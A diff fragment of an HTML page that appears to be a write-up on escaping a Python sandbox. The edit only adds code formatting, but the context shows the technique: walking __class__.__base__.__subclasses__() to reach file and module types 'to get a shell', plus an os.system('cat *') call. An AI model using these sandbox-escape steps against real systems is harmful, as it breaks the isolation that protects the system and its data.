@@ -153,7 +153,7 @@ os.system(&#39;cat *&#39;)
      x.__class__.__base__.__subclasses__()
      Return Value: [&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;,...
 </code></pre></div>
-<p>Ok, I have a long list of values there, but now I have to find out if I can use them to get a shell. Some special values I noticed were:&nbsp;<type 'file'>,&nbsp;<type 'module'>, <type 'zipimport.zipimporter'>. Lets look at file first:</p>
+<p>Ok, I have a long list of values there, but now I have to find out if I can use them to get a shell. Some special values I noticed were:&nbsp;<code>&lt;type &#39;file&#39;&gt;</code>,&nbsp;<code>&lt;type &#39;module&#39;&gt;</code>, <code>&lt;type &#39;zipimport.zipimporter&#39;&gt;</code>. Lets look at file first:</p>
 <div class="highlight"><pre><code class="language-text" data-lang="text">     #setup variable &#39;w&#39; to access the values
      __builtins__[&#39;ww&#39;]=().__class__.__base__
      __builtins__[&#39;w&#39;]=ww.__subclasses__()
